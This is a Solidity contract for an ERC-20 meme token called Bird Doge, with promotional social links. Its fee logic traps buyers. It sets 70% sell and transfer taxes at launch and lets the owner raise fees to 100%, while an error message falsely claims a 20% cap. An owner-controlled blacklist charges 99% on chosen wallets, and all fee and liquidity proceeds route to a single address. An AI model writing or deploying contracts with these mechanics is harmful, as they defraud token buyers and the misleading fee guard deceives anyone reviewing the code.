1 /**
2 
3 Bird Doge ($BIRDOG)
4 
5 Telegram: https://t.me/birdogerc
6 Website: https://bird-dog.org/
7 Twitter: https://twitter.com/birdogeerc
8 
9 */
10 
11 // SPDX-License-Identifier: MIT
12 
13 pragma solidity 0.8.19;
14 
15 
16 library SafeMath {
17 
18     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
19         unchecked {
20             uint256 c = a + b;
21             if (c < a) return (false, 0);
22             return (true, c);
23         }
24     }
25 
26     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
27         unchecked {
28             if (b > a) return (false, 0);
29             return (true, a - b);
30         }
31     }
32 
33     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
34         unchecked {
35             if (a == 0) return (true, 0);
36             uint256 c = a * b;
37             if (c / a != b) return (false, 0);
38             return (true, c);
39         }
40     }
41 
42     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
43         unchecked {
44             if (b == 0) return (false, 0);
45             return (true, a / b);
46         }
47     }
48 
49     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
50         unchecked {
51             if (b == 0) return (false, 0);
52             return (true, a % b);
53         }
54     }
55 
56     function add(uint256 a, uint256 b) internal pure returns (uint256) {
57         return a + b;
58     }
59 
60     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
61         return a - b;
62     }
63 
64     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
65         return a * b;
66     }
67 
68     function div(uint256 a, uint256 b) internal pure returns (uint256) {
69         return a / b;
70     }
71 
72     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
73         return a % b;
74     }
75 
76     function sub(
77         uint256 a,
78         uint256 b,
79         string memory errorMessage
80     ) internal pure returns (uint256) {
81         unchecked {
82             require(b <= a, errorMessage);
83             return a - b;
84         }
85     }
86 
87     function div(
88         uint256 a,
89         uint256 b,
90         string memory errorMessage
91     ) internal pure returns (uint256) {
92         unchecked {
93             require(b > 0, errorMessage);
94             return a / b;
95         }
96     }
97 
98     function mod(
99         uint256 a,
100         uint256 b,
101         string memory errorMessage
102     ) internal pure returns (uint256) {
103         unchecked {
104             require(b > 0, errorMessage);
105             return a % b;
106         }
107     }
108 }
109 
110 interface IERC20 {
111     function decimals() external view returns (uint8);
112     function symbol() external view returns (string memory);
113     function name() external view returns (string memory);
114     function getOwner() external view returns (address);
115     function totalSupply() external view returns (uint256);
116     function balanceOf(address account) external view returns (uint256);
117     function transfer(address recipient, uint256 amount) external returns (bool);
118     function allowance(address _owner, address spender) external view returns (uint256);
119     function approve(address spender, uint256 amount) external returns (bool);
120     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
121     event Transfer(address indexed from, address indexed to, uint256 value);
122     event Approval(address indexed owner, address indexed spender, uint256 value);}
123 
124 abstract contract Ownable {
125     address internal owner;
126     constructor(address _owner) {owner = _owner;}
127     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
128     function isOwner(address account) public view returns (bool) {return account == owner;}
129     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
130     event OwnershipTransferred(address owner);
131 }
132 
133 interface IFactory{
134         function createPair(address tokenA, address tokenB) external returns (address pair);
135         function getPair(address tokenA, address tokenB) external view returns (address pair);
136 }
137 
138 interface IRouter {
139     function factory() external pure returns (address);
140     function WETH() external pure returns (address);
141     function addLiquidityETH(
142         address token,
143         uint amountTokenDesired,
144         uint amountTokenMin,
145         uint amountETHMin,
146         address to,
147         uint deadline
148     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
149 
150     function swapExactTokensForETHSupportingFeeOnTransferTokens(
151         uint amountIn,
152         uint amountOutMin,
153         address[] calldata path,
154         address to,
155         uint deadline) external;
156 }
157 
158 contract BirdDoge is IERC20, Ownable {
159     using SafeMath for uint256;
160     string private constant _name = 'Bird Doge';
161     string private constant _symbol = 'BIRDOG';
162     uint8 private constant _decimals = 9;
163     uint256 private _totalSupply = 1000000000000 * (10 ** _decimals);
164     mapping (address => uint256) _balances;
165     mapping (address => mapping (address => uint256)) private _allowances;
166     mapping (address => bool) public isFeeExempt;
167     mapping (address => bool) private isBot;
168     IRouter router;
169     address public pair;
170     bool private tradingAllowed = false;
171     bool private swapEnabled = true;
172     uint256 private swapTimes;
173     bool private swapping;
174     uint256 swapAmount = 4;
175     uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
176     uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
177     modifier lockTheSwap {swapping = true; _; swapping = false;}
178     uint256 private liquidityFee = 0;
179     uint256 private marketingFee = 200;
180     uint256 private developmentFee = 200;
181     uint256 private burnFee = 0;
182     uint256 private totalFee = 3000;
183     uint256 private sellFee = 7000;
184     uint256 private transferFee = 7000;
185     uint256 private denominator = 10000;
186     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
187     address internal development_receiver = 0x47348110057e284d9C7e5A0b8EA79Ad1364243D3; 
188     address internal marketing_receiver =  0x47348110057e284d9C7e5A0b8EA79Ad1364243D3;
189     address internal liquidity_receiver = 0x47348110057e284d9C7e5A0b8EA79Ad1364243D3;
190     uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
191     uint256 public _maxSellAmount = ( _totalSupply * 200 ) / 10000;
192     uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;
193 
194     constructor() Ownable(msg.sender) {
195         router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
196         isFeeExempt[address(this)] = true;
197         isFeeExempt[liquidity_receiver] = true;
198         isFeeExempt[marketing_receiver] = true;
199         isFeeExempt[development_receiver] = true;
200         isFeeExempt[msg.sender] = true;
201         _balances[msg.sender] = _totalSupply;
202         emit Transfer(address(0), msg.sender, _totalSupply);
203     }
204 
205     receive() external payable {}
206     function name() public pure returns (string memory) {return _name;}
207     function symbol() public pure returns (string memory) {return _symbol;}
208     function decimals() public pure returns (uint8) {return _decimals;}
209     function startTrading() external onlyOwner {tradingAllowed = true;}
210     function getOwner() external view override returns (address) { return owner; }
211     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
212     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
213     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
214     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
215     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
216     function totalSupply() public view override returns (uint256) {return _totalSupply;}
217 
218     function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
219         bool aboveMin = amount >= minTokenAmount;
220         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
221         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
222     }
223 
224     function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
225         swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
226         minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
227     }
228 
229     function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
230         liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
231         require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
232     }
233 
234     function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
235         uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
236         _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
237         uint256 limit = totalSupply().mul(5).div(10000);
238         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
239     }
240 
241     function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {
242         marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;
243         isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
244     }
245 
246     function setisBot(address[] calldata addresses, bool _enabled) external onlyOwner {
247         for(uint i=0; i < addresses.length; i++){
248         isBot[addresses[i]] = _enabled; }
249     }
250 
251     function manualSwap() external onlyOwner {
252         uint256 amount = balanceOf(address(this));
253         if(amount > swapThreshold){amount = swapThreshold;}
254         swapAndLiquify(amount);
255     }
256 
257     function rescueERC20(address _address, uint256 percent) external onlyOwner {
258         uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
259         IERC20(_address).transfer(development_receiver, _amount);
260     }
261 
262     function setPairAddress(address _pair) external onlyOwner {
263         pair = _pair;
264     }
265 
266     function swapAndLiquify(uint256 tokens) private lockTheSwap {
267         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
268         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
269         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
270         uint256 initialBalance = address(this).balance;
271         swapTokensForETH(toSwap);
272         uint256 deltaBalance = address(this).balance.sub(initialBalance);
273         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
274         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
275         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
276         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
277         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
278         uint256 contractBalance = address(this).balance;
279         if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}
280     }
281 
282     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
283         _approve(address(this), address(router), tokenAmount);
284         router.addLiquidityETH{value: ETHAmount}(
285             address(this),
286             tokenAmount,
287             0,
288             0,
289             liquidity_receiver,
290             block.timestamp);
291     }
292 
293     function swapTokensForETH(uint256 tokenAmount) private {
294         address[] memory path = new address[](2);
295         path[0] = address(this);
296         path[1] = router.WETH();
297         _approve(address(this), address(router), tokenAmount);
298         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
299             tokenAmount,
300             0,
301             path,
302             address(this),
303             block.timestamp);
304     }
305 
306     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
307         return !isFeeExempt[sender] && !isFeeExempt[recipient];
308     }
309 
310     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
311         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
312         if(recipient == pair){return sellFee;}
313         if(sender == pair){return totalFee;}
314         return transferFee;
315     }
316 
317     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
318         if(getTotalFee(sender, recipient) > 0){
319         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
320         _balances[address(this)] = _balances[address(this)].add(feeAmount);
321         emit Transfer(sender, address(this), feeAmount);
322         if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
323         return amount.sub(feeAmount);} return amount;
324     }
325 
326     function _transfer(address sender, address recipient, uint256 amount) private {
327         require(sender != address(0), "ERC20: transfer from the zero address");
328         require(recipient != address(0), "ERC20: transfer to the zero address");
329         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
330         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
331         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
332         require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
333         if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
334         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded"); 
335         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
336         if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
337         _balances[sender] = _balances[sender].sub(amount);
338         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
339         _balances[recipient] = _balances[recipient].add(amountReceived);
340         emit Transfer(sender, recipient, amountReceived);
341     }
342 
343     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
344         _transfer(sender, recipient, amount);
345         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
346         return true;
347     }
348 
349     function _approve(address owner, address spender, uint256 amount) private {
350         require(owner != address(0), "ERC20: approve from the zero address");
351         require(spender != address(0), "ERC20: approve to the zero address");
352         _allowances[owner][spender] = amount;
353         emit Approval(owner, spender, amount);
354     }
355 }